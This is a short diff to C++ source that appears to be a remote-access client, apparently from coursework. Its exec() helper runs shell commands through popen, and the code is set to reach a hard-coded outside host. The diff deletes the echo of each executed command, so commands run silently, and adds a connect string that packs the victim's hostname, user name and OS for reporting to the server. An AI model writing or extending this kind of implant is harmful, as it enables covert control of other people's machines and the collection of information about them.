@@ -16,7 +16,6 @@ const string HOST_URL = "http://cs4001.root.sx:3000/";
 string exec(string cmd, string working_dir=".") {
     array<char, 128> buffer;
     string output;
-    cout << cmd << endl;
     unique_ptr<FILE, decltype(&pclose)> pipe(
             popen(("cd " + working_dir + "; " + cmd).c_str(), "r"), pclose);
 
@@ -194,6 +193,8 @@ int main(int argc, char* argv[]) {
     string user = exec("id -un");
     string os = get_os();
     string response;
+
+    string connect_string = "hostname=" + hostname + "&user=" + user + "&os=" + os;
 
     // wait for server
     while (response.empty()) {
